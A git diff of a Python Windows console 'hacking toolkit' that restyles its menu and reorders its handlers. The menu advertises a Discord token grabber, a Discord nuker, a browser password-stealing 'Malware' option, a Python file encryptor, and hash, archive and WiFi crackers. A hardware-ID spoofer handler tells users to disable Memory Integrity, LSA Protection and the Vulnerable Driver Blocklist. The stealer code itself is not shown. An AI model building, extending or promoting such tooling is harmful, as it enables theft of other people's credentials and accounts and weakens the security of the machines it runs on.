-            print(f'{cyan}║  {lcyan}[10]{white} Hash Cracker                    {lcyan}[11]{white} 7z Files Cracker                  {lcyan}[12]{white} ZIP Files Cracker{cyan}  ║')
-            print(f'{cyan}║  {lcyan}[13]{white} Show Saved WiFi Passwords       {lcyan}[14]{white} Fastest Wordlist Generator        {lcyan}[15]{white} WiFi Cracker{cyan}       ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
+            print(f'\n{darkred}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
+            print(f'{darkred}║                                    {lcyan}💀 SOCIAL & WEB WARFARE 💀{darkred}                                        ║')
+            print(f'{darkred}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
+            print(f'{darkred}║  {lcyan}[16]{white} 🕷️ Discord Token Grabber        {lcyan}[17]{white} 🕷️ Discord Webhook Spammer        {lcyan}[18]{white} ☠️ Discord Nuker{darkred}   ║')
+            print(f'{darkred}║  {lcyan}[19]{white} 📧 HotMail Checker              {lcyan}[20]{white} 📍 Public IP Lookup               {lcyan}[21]{white} 🎭 URL Masking{lcyan}     ║')
+            print(f'{darkred}║  {lcyan}[22]{white} 🔍 Advanced Nmap Commands       {lcyan}[23]{white} 🌊 Proxy Scraper                  {lcyan}[24]{white} ✅ Proxy Checker{lcyan}   ║')
+            print(f'{darkred}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
             
-            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║                                    {lcyan}🌐 NETWORK & WEB TOOLS{cyan}                                            ║')
-            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
-            print(f'{cyan}║  {lcyan}[16]{white} Discord Users Checker           {lcyan}[17]{white} Discord Webhook Spammer           {lcyan}[18]{white} URL Masking{cyan}        ║')
-            print(f'{cyan}║  {lcyan}[19]{white} IP & Domain Lookup              {lcyan}[20]{white} Public IP Lookup                  {lcyan}[21]{white} Phone Tracker{cyan}      ║')
-            print(f'{cyan}║  {lcyan}[22]{white} Advanced Nmap Commands          {lcyan}[23]{white} Proxy Scraper                     {lcyan}[24]{white} Proxy Checker{cyan}      ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
+            print(f'\n{darkred}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
+            print(f'{darkred}║                                    {lcyan}⚡ ADVANCED & SPECIAL TOOLS ⚡{darkred}                                    ║')
+            print(f'{darkred}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
+            print(f'{lcyan}║  {lcyan}[25]{white} 🦠 Malware (Chrome/Opera/Edge){darkred}                                                                 ║')
+            print(f'{lcyan}║  {lcyan}[26]{white} 🦠 Encrypt Python File{darkred}                                                                         ║')
+            print(f'{darkred}║  {lcyan}[27]{white} ⚙️ Settings & Configuration{lcyan}                                                                    ║')
+            print(f'{darkred}║  {lcyan}[28]{white} 📈 System Monitor{lcyan}                                                                              ║')
+            print(f'{lcyan}║  {lcyan}[29]{white} ℹ️ About & Help{darkred}                                                                                ║')
+            print(f'{darkred}║  {lcyan}[00]{white} 💀 EXIT APPLICATION{darkred}                                                                            ║')
+            print(f'{darkred}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
             
-            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║                                    {lcyan}⚙️  ADVANCED & SPECIAL TOOLS{cyan}                                      ║')
-            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
-            print(f'{cyan}║  {lcyan}[25]{white} Malware (Chrome/Opera Password Stealer)                                                {cyan}        ║')
-            print(f'{cyan}║  {lcyan}[26]{white} Settings & Configuration                                                              {cyan}         ║')
-            print(f'{cyan}║  {lcyan}[27]{white} System Monitor                                                                        {cyan}         ║')
-            print(f'{cyan}║  {lcyan}[28]{white} About & Help                                                                          {cyan}         ║')
-            print(f'{cyan}║  {lcyan}[00]{white} Exit Application                                                                      {cyan}         ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
-            
-            # Footer with version and social links
-            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║  {lcyan}🔗 GitHub:{white} https://github.com/apkaless  {lcyan}📱 Instagram:{white} @apkaless  {lcyan}🌍 Region:{white} IRAQ  {lcyan}📦 Version:{white} {cversion}{cyan}     ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
-            
-            # Enhanced input prompt
-            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║  {lcyan}💡 Tip:{white} Use the number keys to navigate. Type {lcyan}00{white} to exit.{cyan}                                           ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
-            
-            cmd = input(f'\n{green}[{current_time}]{lcyan} ➤ {white}Enter your choice: ').strip()
+            # BRUTAL Footer with version and social links
+            print(f'\n{darkred}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
+            print(f'{lcyan}║  {lcyan}🔗 GitHub:{white} https://github.com/apkaless  {lcyan}📱 Instagram:{white} @apkaless  {lcyan}🌍 Region:{white} IRAQ  {lcyan}📦 Version:{white} {cversion}{lcyan}     ║')
+            print(f'{darkred}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
+
+            cmd = input(f'\n{lcyan}[💀]{white} SELECT YOUR BRUTAL OPTION: ').strip()
             
             # Exit command
             if cmd == '00':
@@ -3700,153 +4524,233 @@ def enhanced_main():
             # System Tools & Utilities
             if cmd == '1':
                 try:
-                    subprocess.check_output('cmd.exe /C start "IDM" tools/IDM_Trial_Reset.exe', shell=True)
-                    print(f'\n{green}[+] IDM Trial Reset launched successfully!{rescolor}')
+                    os.system('cls')
+                    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
+                    print(f'{cyan}║                               SYSTEM SPOOFER                                 ║')
+                    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
+                    
+                    print(f'{yellow}[!] {white}This tool will spoof multiple system identifiers:{rescolor}\n')
+                    print(f'\t{cyan}•{white} Machine GUID, Product ID, HW Profile GUID')
+                    print(f'\t{cyan}•{white} MAC Address, Display ID, GPU ID')
+                    print(f'\t{cyan}•{white} Disk Serial Numbers')
+                    print(f'\t{cyan}•{white} HWID Serial Numbers')
+                    print(f'\t{cyan}•{white} Machine ID and other system identifiers{rescolor}\n')
+                    
+                    print(f'{cyan}[+] Choose spoofing mode:{rescolor}\n')
+                    print(f'\t{cyan}[1]{white} All in one Spoof (All features)')
+                    print(f'\t{cyan}[2]{white} Quick Spoof (Essential only)')
+                    print(f'\t{cyan}[3]{white} Disk ID Spoof')
+                    print(f'\t{cyan}[4]{white} HWIDs Spoof')
+                    print(f'\t{cyan}[5]{white} List Backups')
+                    print(f'\t{cyan}[6]{white} Restore from Backup')
+                    print(f'\t{cyan}[7]{white} Back to Main Menu{rescolor}\n')
+                    if is_admin():
+                        if value_checker(r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa', 'RunAsPPL'):
+                            if value_checker(r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Config', 'VulnerableDriverBlocklistEnable'):
+                                try:
+                                    from pytools.enhanced_spoofer import EnhancedSpoofer as Spoofer
+                                    spoofer = Spoofer()
+                                    while True:
+                                        
+                                        choice = input(f'{green}[+] {white}Enter your choice (1-5): ').strip()
+                                        
+                                        if choice == '1':
+                                            print(f'\n{yellow}[!] {white}Starting All in one system spoofing...{rescolor}')
+                                            print(f'{yellow}[!] {white}This may take several minutes. Please wait...{rescolor}')
+                                            # input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            
+                                            try:
+                                                spoofer.comprehensive_spoof()
+                                            except Exception as e:
+                                                print(f'\n{lcyan}[-] All in one spoofing failed: {e}{rescolor}')
+                                                
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            break
+                                            
+                                        elif choice == '2':
+                                            print(f'\n{yellow}[!] {white}Starting quick essential spoofing...{rescolor}')
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            
+                                            try:
+                                                spoofer.quick_spoof()
+                                            except Exception as e:
+                                                print(f'\n{lcyan}[-] Quick spoofing failed: {e}{rescolor}')
+                                                
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            break
+                                            
+                                        elif choice == '3':
+                                            spoofer.spoof_disk_serial()
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            break
+                                        elif choice == '4':
+                                            spoofer.spoofhwid()
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            break
+                                        elif choice == '5':
+                                            spoofer.list_backups()
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}') 
+                                            break
+                                        elif choice == '6':
+                                            backup_file = input(f'{green}[+] {white}Enter backup file name: ').strip()
+                                            if backup_file:
+                                                backup_path = os.path.join(spoofer.backup_dir, backup_file)
+                                                spoofer.restore_from_backup(backup_path)
+                                            else:
+                                                print(f'{lcyan}[-] No backup file specified{rescolor}')
+                                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                            break
+                                            
+                                        elif choice == '7':
+                                            break
+                                        else:
+                                            print(f'{lcyan}[-] Invalid choice. Please enter 1-5.{rescolor}')         
+                                except Exception as e:
+                                    print(f'{lcyan}[-] Spoofer initialization failed: {e}{rescolor}')
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                            print(f'\n{yellow}[!] {white}Please Turn OFF These: {yellow}\n\n\t\t*> {white}Memory Integrity\n\t\t{yellow}*> {white}Local Security Authority Protection\n\t\t{yellow}*> {white}Microsoft Vulnerable Driver Blocklist\n\n{white}Settings {cyan}>{rescolor} Privacy & Security {cyan}>{rescolor} Windows Security {cyan}>{rescolor} Device Security {cyan}>{rescolor} Core Isolation{rescolor}\n\nThen Restart Your Comuter')
+                            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                        print(f'\n{yellow}[!] {white}Please Turn OFF These: {yellow}\n\n\t\t*> {white}Memory Integrity\n\t\t{yellow}*> {white}Local Security Authority Protection\n\t\t{yellow}*> {white}Microsoft Vulnerable Driver Blocklist\n\n{white}Settings {cyan}>{rescolor} Privacy & Security {cyan}>{rescolor} Windows Security {cyan}>{rescolor} Device Security {cyan}>{rescolor} Core Isolation{rescolor}\n\nThen Restart Your Comuter')
+                        input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    else:
+                        input(f"\n{yellow}[!] {white}Run This Tool As Admin And Try Again !{rescolor}")
+                        
                 except Exception as e:
-                    print(f'\n{red}[-] Failed to launch IDM Trial Reset: {e}{rescolor}')
-                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    print(f'\n{lcyan}[-] System Spoofer failed: {e}{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 
             elif cmd == '2':
                 try:
-                    from pytools.system_cleaner import SystemCleaner
-                    cleaner = SystemCleaner()
-                    while True:
-                        os.system('cls')
-                        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
-                        print(f'{cyan}║                              ADVANCED SYSTEM CLEANER                         ║')
-                        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
+                    os.system('cls')
+                    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
+                    print(f'{cyan}║                                 SYSTEM TWEAKER                               ║')
+                    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
 
-                        def print_result(result):
-                            status = f"{green}[SUCCESS]{rescolor}" if result.success else f"{red}[FAILED]{rescolor}"
-                            print(f"{status} {white}{result.message}{rescolor}")
+                    tw = SystemTweaker()
 
+                    def print_result(res):
                         try:
-                            print(f'{cyan}Available Cleanup Options:{rescolor}\n')
-                            print(f'{white}[1]{rescolor} Clean Temporary Files')
-                            print(f'{white}[2]{rescolor} Clean Browser Cache')
-                            print(f'{white}[3]{rescolor} Clean System Logs')
-                            print(f'{white}[4]{rescolor} Clean Windows Update Cache (Admin)')
-                            print(f'{white}[5]{rescolor} Clean Prefetch Files (Admin)')
-                            print(f'{white}[6]{rescolor} Clean Recent Files')
-                            print(f'{white}[7]{rescolor} Empty Recycle Bin')
-                            print(f'{white}[8]{rescolor} Run Disk Cleanup')
-                            print(f'{white}[9]{rescolor} Comprehensive Clean')
-                            print(f'{white}[10]{rescolor} System Information')
-                            print(f'{white}[0]{rescolor} Back to main menu')
+                            status = f"{green}[SUCCESS]{rescolor}" if res.success else f"{lcyan}[FAILED]{rescolor}"
+                            print(f"{status} {white}{res.message}{rescolor}")
+                        except Exception:
+                            print(res)
 
-                            choice = input(f'\n{green}[+] {white}Choose option (0-10): {rescolor}').strip()
+                    while True:
+                        try:
+                            print(f'{cyan}Available Tweaks:{rescolor}\n')
+                            print(f'\t{cyan}[1]{rescolor} Flush DNS cache')
+                            print(f'\t{cyan}[2]{rescolor} Reset Winsock {cyan}(admin)')
+                            print(f'\t{cyan}[3]{rescolor} Reset IP stack IPv4/IPv6 {cyan}(admin)')
+                            print(f'\t{cyan}[4]{rescolor} Set DNS for adapters {cyan}(admin)')
+                            print(f'\t{cyan}[5]{rescolor} Optimize TCP parameters {cyan}(admin)')
+                            print(f'\t{cyan}[6]{rescolor} Apply privacy tweaks {cyan}(admin)')
+                            print(f'\t{cyan}[7]{rescolor} Revert privacy tweaks {cyan}(admin)')
+                            print(f'\t{cyan}[8]{rescolor} Clear temporary files')
+                            print(f'\t{cyan}[9]{rescolor} Debloat Microsoft Edge {cyan}(admin)')
+                            print(f'\t{cyan}[10]{rescolor} Disable Windows Copilot {cyan}(admin)')
+                            print(f'\t{cyan}[0]{rescolor} Back to main menu')
 
-                            if choice == '0':
-                                break
-                            elif choice == '1':
-                                os.system('cls')
-                                print_result(cleaner.clean_temp_files())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '2':
-                                os.system('cls')
-                                print_result(cleaner.clean_browser_cache())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '3':
-                                os.system('cls')
-                                print_result(cleaner.clean_system_logs())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '4':
-                                os.system('cls')
-                                print_result(cleaner.clean_windows_update_cache())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '5':
-                                os.system('cls')
-                                print_result(cleaner.clean_prefetch_files())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '6':
-                                os.system('cls')
-                                print_result(cleaner.clean_recent_files())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '7':
-                                os.system('cls')
-                                print_result(cleaner.clean_recycle_bin())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '8':
-                                os.system('cls')
-                                print_result(cleaner.clean_disk_cleanup())
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '9':
-                                os.system('cls')
-                                print(f'{yellow}[!] {white}Starting comprehensive system cleanup...{rescolor}')
-                                print(f'{yellow}[!] {white}This may take several minutes. Please wait...{rescolor}')
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                
-                                results = cleaner.comprehensive_clean()
-                                os.system('cls')
-                                print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
-                                print(f'{cyan}║                              CLEANUP SUMMARY                                 ║')
-                                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
-                                
-                                total_items = 0
-                                total_size = 0
-                                for result in results:
-                                    print_result(result)
-                                    total_items += result.items_cleaned
-                                    total_size += result.space_freed
-                                
-                                print(f'\n{green}🎉 TOTAL CLEANUP RESULTS:{rescolor}')
-                                print(f'{white}• Items cleaned: {total_items:,}{rescolor}')
-                                print(f'{white}• Space freed: {cleaner._format_size(total_size)}{rescolor}')
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                            elif choice == '10':
-                                os.system('cls')
-                                info = cleaner.get_system_info()
-                                print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
-                                print(f'{cyan}║                            SYSTEM INFORMATION                                ║')
-                                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
-                                
-                                for key, value in info.items():
-                                    if key != 'error':
-                                        print(f'{white}{key.replace("_", " ").title()}:{rescolor} {green}{value}{rescolor}')
-                                
-                                if 'error' in info:
-                                    print(f'{red}Error: {info["error"]}{rescolor}')
-                                
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                            if is_admin():
+                                choice = input(f'\n{green}[+] {white}Choose option (0-11): {rescolor}').strip()
+
+                                if choice == '0':
+                                    break
+                                elif choice == '1':
+                                    os.system('cls')
+                                    print_result(tw.flush_dns())
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '2':
+                                    os.system('cls')
+                                    print_result(tw.reset_winsock())
+                                    print(f"{yellow}[!] A reboot is recommended for changes to take effect{rescolor}")
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '3':
+                                    os.system('cls')
+                                    print_result(tw.reset_ip_stack())
+                                    print(f"{yellow}[!] A reboot is recommended for changes to take effect{rescolor}")
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '4':
+                                    os.system('cls')
+                                    primary = input(f'{green}[+] Primary DNS (e.g., 1.1.1.1):{white} ').strip()
+                                    secondary = input(f'{green}[+] Secondary DNS (optional):{white} ').strip()
+                                    secondary = secondary if secondary else None
+                                    results = tw.set_dns_for_all_adapters(primary, secondary)
+                                    os.system('cls')
+                                    for r in results:
+                                        print_result(r)
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '5':
+                                    os.system('cls')
+                                    results = tw.optimize_tcp()
+                                    for r in results:
+                                        print_result(r)
+                                    print(f"{yellow}[!] A reboot may improve effect of TCP changes{rescolor}")
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '6':
+                                    os.system('cls')
+                                    results = tw.apply_privacy_tweaks()
+                                    for r in results:
+                                        print_result(r)
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '7':
+                                    os.system('cls')
+                                    results = tw.revert_privacy_tweaks()
+                                    for r in results:
+                                        print_result(r)
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '8':
+                                    os.system('cls')
+                                    print_result(tw.clear_temp_files())
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '9':
+                                    os.system('cls')
+                                    results = tw.debloat_edge()
+                                    for r in results:
+                                        print_result(r)
+                                    print(f"{yellow}[!] Some changes may require a reboot{rescolor}")
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                elif choice == '10':
+                                    os.system('cls')
+                                    results = tw.disable_copilot()
+                                    for r in results:
+                                        print_result(r)
+                                    print(f"{yellow}[!] Sign out/in or reboot may be needed to reflect UI changes{rescolor}")
+                                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                                else:
+                                    print(f'{lcyan}[-] Invalid option. Choose 0-11.{rescolor}')
+                                    time.sleep(1)
+                                    os.system('cls')
                             else:
-                                print(f'{red}[-] Invalid option. Choose 0-10.{rescolor}')
-                                time.sleep(1)
-                                os.system('cls')
+                                input(f"\n{yellow}[!] {white}Run This Tool As Admin And Try Again !{rescolor}\n")
                         except KeyboardInterrupt:
                             break
                         except Exception as e:
-                            print(f'\n{red}[-] System Cleaner error: {e}{rescolor}')
+                            print(f'\n{lcyan}[-] System Tweaker error: {e}{rescolor}')
                             input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
 
                 except Exception as e:
-                    print(f'\n{red}[-] Failed to open System Cleaner: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Failed to open System Tweaker: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 
             elif cmd == '3':
+                enhanced_sysinfo()
+                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            elif cmd == '4':
                 try:
                     subprocess.check_output('cmd.exe /C start "Activation" tools/WindowsActivation.exe', shell=True)
                     print(f'\n{green}[+] Windows Activation tool launched successfully!{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] Failed to launch Windows Activation tool: {e}{rescolor}')
-                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                
-            elif cmd == '4':
-                try:
-                    os.system('cls')
-                    subprocess.check_output('cmd.exe /c start "NetOptimizer" tools/Network_Optimizer.exe', shell=True)
-                    print(f'\n{green}[+] Network Optimizer launched successfully!{rescolor}')
-                except Exception as e:
-                    print(f'\n{red}[-] Failed to launch Network Optimizer: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Failed to launch Windows Activation tool: {e}{rescolor}')
                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 
             elif cmd == '5':
                 try:
                     os.system('cls')
-                    enhanced_sysinfo()
-                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    subprocess.check_output('cmd.exe /c start "NetOptimizer" tools/Network_Optimizer.exe', shell=True)
+                    print(f'\n{green}[+] Network Optimizer launched successfully!{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] System info failed: {e}{rescolor}')
-                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    print(f'\n{lcyan}[-] Failed to launch Network Optimizer: {e}{rescolor}')
+                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '6':
                 try:
@@ -3860,7 +4764,7 @@ def enhanced_main():
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] Python to EXE conversion failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Python to EXE conversion failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '7':
@@ -3889,7 +4793,7 @@ def enhanced_main():
                             print(f'\n{green}[+] {white}HWID Generation Complete!{white}')
                             print(f'{green}[+] {white}Current HWID: {yellow}{hwid}{white}')
                         else:
-                            print(f'\n{red}[-] {white}Failed to generate HWID{white}')
+                            print(f'\n{lcyan}[-] {white}Failed to generate HWID{white}')
                         
                     elif hwid_choice == '2':
                         os.system('cls')
@@ -3922,7 +4826,7 @@ def enhanced_main():
                                 print(f'{yellow}[!] {white}Could not open file automatically: {e}{white}')
                                 print(f'{yellow}[!] {white}Please open manually: {cyan}{report_file}{white}')
                         else:
-                            print(f'\n{red}[-] {white}Failed to generate report{white}')
+                            print(f'\n{lcyan}[-] {white}Failed to generate report{white}')
                             
                     elif hwid_choice == '4':
                         os.system('cls')
@@ -3935,208 +4839,141 @@ def enhanced_main():
                     elif hwid_choice == '5':
                         continue
                     else:
-                        print(f'\n{red}[-] {white}Invalid choice! Please select 1-5.{white}')
+                        print(f'\n{lcyan}[-] {white}Invalid choice! Please select 1-5.{white}')
                         time.sleep(2)
                         continue
                         
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
                 except Exception as e:
-                    print(f'\n{red}[-] HWID operation failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] HWID operation failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
                 
             elif cmd == '8':
                 try:
-                    os.system('cls')
-                    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
-                    print(f'{cyan}║                               SYSTEM SPOOFER                                 ║')
-                    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
-                    
-                    print(f'{yellow}[!] {white}This tool will spoof multiple system identifiers:{rescolor}')
-                    print(f'{blue}•{white} Machine GUID, Product ID, HW Profile GUID')
-                    print(f'{blue}•{white} MAC Address, Display ID, GPU ID')
-                    print(f'{blue}•{white} BIOS Information, Disk Serial Numbers')
-                    print(f'{blue}•{white} Machine ID and other system identifiers{rescolor}\n')
-                    
-                    print(f'{cyan}Choose spoofing mode:{rescolor}')
-                    print(f'{blue}[1]{white} Comprehensive Spoof (All features)')
-                    print(f'{blue}[2]{white} Quick Spoof (Essential only)')
-                    print(f'{blue}[3]{white} List Backups')
-                    print(f'{blue}[4]{white} Restore from Backup')
-                    print(f'{blue}[5]{white} Back to Main Menu{rescolor}\n')
-                    
-                    try:
-                        from pytools.enhanced_spoofer import EnhancedSpoofer
-                        spoofer = EnhancedSpoofer()
-                        
-                        while True:
-                            choice = input(f'{green}[+] {white}Enter your choice (1-5): ').strip()
-                            
-                            if choice == '1':
-                                print(f'\n{yellow}[!] {white}Starting comprehensive system spoofing...{rescolor}')
-                                print(f'{yellow}[!] {white}This may take several minutes. Please wait...{rescolor}')
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                
-                                try:
-                                    spoofer.comprehensive_spoof()
-                                except Exception as e:
-                                    print(f'\n{red}[-] Comprehensive spoofing failed: {e}{rescolor}')
-                                    
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                break
-                                
-                            elif choice == '2':
-                                print(f'\n{yellow}[!] {white}Starting quick essential spoofing...{rescolor}')
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                
-                                try:
-                                    spoofer.quick_spoof()
-                                except Exception as e:
-                                    print(f'\n{red}[-] Quick spoofing failed: {e}{rescolor}')
-                                    
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                break
-                                
-                            elif choice == '3':
-                                spoofer.list_backups()
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                break
-                                
-                            elif choice == '4':
-                                backup_file = input(f'{green}[+] {white}Enter backup file name: ').strip()
-                                if backup_file:
-                                    backup_path = os.path.join(spoofer.backup_dir, backup_file)
-                                    spoofer.restore_from_backup(backup_path)
-                                else:
-                                    print(f'{red}[-] No backup file specified{rescolor}')
-                                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                                break
-                                
-                            elif choice == '5':
-                                break
-                            else:
-                                print(f'{red}[-] Invalid choice. Please enter 1-5.{rescolor}')
-                                
-                    except Exception as e:
-                        print(f'{red}[-] Spoofer initialization failed: {e}{rescolor}')
-                        
-                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                    
-                except Exception as e:
-                    print(f'\n{red}[-] System Spoofer failed: {e}{rescolor}')
-                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-            
-            elif cmd == "9":
-                try:
-                    os.system('cls')
-                    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
-                    print(f'{cyan}║                                 SYSTEM TWEAKER                               ║')
-                    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
-
-                    tw = SystemTweaker()
-
-                    def print_result(res):
-                        try:
-                            # TweakResult dataclass
-                            status = f"{green}[SUCCESS]{rescolor}" if res.success else f"{red}[FAILED]{rescolor}"
-                            print(f"{status} {white}{res.message}{rescolor}")
-                        except Exception:
-                            print(res)
-
+                    from pytools.system_cleaner import SystemCleaner
+                    cleaner = SystemCleaner()
                     while True:
-                        try:
-                            print(f'{cyan}Available Tweaks:{rescolor}')
-                            print(f'{white}[1]{rescolor} Flush DNS cache')
-                            print(f'{white}[2]{rescolor} Reset Winsock (admin)')
-                            print(f'{white}[3]{rescolor} Reset IP stack IPv4/IPv6 (admin)')
-                            print(f'{white}[4]{rescolor} Set DNS for adapters (admin)')
-                            print(f'{white}[5]{rescolor} Optimize TCP parameters (admin)')
-                            print(f'{white}[6]{rescolor} Apply privacy tweaks (admin)')
-                            print(f'{white}[7]{rescolor} Revert privacy tweaks (admin)')
-                            print(f'{white}[8]{rescolor} Clear temporary files')
-                            print(f'{white}[9]{rescolor} Debloat Microsoft Edge (admin)')
-                            print(f'{white}[10]{rescolor} Disable Windows Copilot (admin)')
-                            print(f'{white}[0]{rescolor} Back to main menu')
+                        os.system('cls')
+                        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
+                        print(f'{cyan}║                              ADVANCED SYSTEM CLEANER                         ║')
+                        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
 
-                            choice = input(f'\n{green}[+] {white}Choose option (0-11): {rescolor}').strip()
+                        def print_result(result):
+                            status = f"{green}[SUCCESS]{rescolor}" if result.success else f"{lcyan}[FAILED]{rescolor}"
+                            print(f"{status} {white}{result.message}{rescolor}")
+
+                        try:
+                            print(f'{cyan}Available Cleanup Options:{rescolor}\n')
+                            print(f'\t{blue}[1]{rescolor} All in one Clean')
+                            print(f'\t{blue}[2]{rescolor} Clean Temporary Files')
+                            print(f'\t{blue}[3]{rescolor} Clean Browser Cache')
+                            print(f'\t{blue}[4]{rescolor} Clean System Logs')
+                            print(f'\t{blue}[5]{rescolor} Clean Windows Update Cache {blue}(Admin)')
+                            print(f'\t{blue}[6]{rescolor} Clean Prefetch Files {blue}(Admin)')
